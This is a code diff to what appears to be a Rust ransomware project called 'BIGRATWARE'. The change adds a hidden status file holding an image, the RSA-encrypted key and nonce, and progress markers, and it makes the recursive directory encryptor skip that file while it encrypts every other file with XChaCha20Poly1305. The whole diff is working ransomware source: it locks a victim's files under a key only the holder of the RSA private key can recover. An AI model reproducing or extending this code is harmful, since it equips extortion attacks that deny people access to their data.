@@ -12,6 +12,9 @@ use sha2::Sha512;
 use decryptor::helpers::gen_new_path;
 use crate::BIGRAT_PNG;
 
+#[cfg(windows)]
+use std::os::windows::fs::OpenOptionsExt;
+
 const BUFFER_SIZE: usize = 500;
 
 fn encrypt_file(
@@ -53,16 +56,21 @@ fn encrypt_file(
 }
 
 fn encrypt_dir_recursive(
-    path: &Path,
+    base_path: &Path,
+    current_path: &Path,
     aead: &XChaCha20Poly1305,
     nonce: &[u8],
     encrypted_key: &[u8],
     encrypted_nonce: &[u8],
 ) -> Result<()> {
-    for entry in path.read_dir()? {
+    for entry in current_path.read_dir()? {
         let entry = entry?;
         if entry.file_type()?.is_dir() {
-            encrypt_dir_recursive(&entry.path(), &aead, nonce, encrypted_key, encrypted_nonce)?;
+            encrypt_dir_recursive(base_path, &entry.path(), &aead, nonce, encrypted_key, encrypted_nonce)?;
+            continue;
+        }
+
+        if current_path == base_path && entry.file_name().to_str().unwrap() == ".bigrat-status" {
             continue;
         }
 
@@ -112,9 +120,31 @@ pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut Thre
     let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &nonce)
         .with_context(|| "Failed to encrypt the nonce")?;
 
+    let err_context = || "Failed to create a status file";
+    #[cfg(not(windows))]
+        let mut status_file = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .open(path.join(".bigrat-status"))
+        .with_context(err_context)?;
+    #[cfg(windows)]
+        let mut status_file = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .attributes(0x2)  // hidden file
+        .open(path.join(".bigrat-status"))
+        .with_context(err_context)?;
+    status_file.write_all(BIGRAT_PNG).with_context(err_context)?;
+    status_file.write_all(&encrypted_key).with_context(err_context)?;
+    status_file.write_all(&encrypted_nonce).with_context(err_context)?;
+    status_file.write_all(b"BIGRATWARE_STATUS=started;").with_context(err_context)?;
+
     let aead = XChaCha20Poly1305::new(key.as_ref().into());
 
-    encrypt_dir_recursive(path, &aead, &nonce, &encrypted_key, &encrypted_nonce)?;
+    encrypt_dir_recursive(path, path, &aead, &nonce, &encrypted_key, &encrypted_nonce)?;
+
+    status_file.write_all(b"BIGRATWARE_STATUS=finished;")
+        .with_context(|| "Failed to write to a status file")?;
 
     Ok(())
 }
